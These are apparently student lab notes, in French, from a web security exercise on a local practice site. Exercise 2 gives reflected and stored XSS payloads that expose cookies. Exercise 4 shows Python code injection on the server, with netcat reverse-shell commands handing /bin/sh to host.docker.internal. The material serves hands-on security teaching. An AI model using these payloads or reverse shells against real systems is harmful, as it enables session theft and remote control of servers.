# TP6 : 

## Exercice 2 

### Question 1 :

Una attaque XSS réfléchie est une attaque d'insertion de code sur un sitedans l'adresse html.

Pour attaquer le site nous pouvons ajouter le code suivant à l'adresse pour afficher les cookies actuels : 

    http://127.0.0.1:5000/?q="><script> alert(document.cookie)</script>

### Question 2 :

L'attaque stocké a elle lieu sur les site ou l'on peut publier des éléments comme des forum,
Sur notre site on peut injecter en publiant le commentaire suivant pour effectuer la même action :

    <script> alert(document.cookie)</script>

## Exercice 4 :

En exécutant la commande suivante, on se rend compte que nous sommes sur le serveur :

    print(os.getcwd())


nc -l 5555 -v -e /bin/sh

import subprocess

subprocess.run("ls")

au niveau du site on voit que la commande est éxécuter 
mais au niveau du serveur on peut voir le résultat

subprocess.run(["nc","host.docker.internal","55555","-e","/bin/sh"])

whoam i 
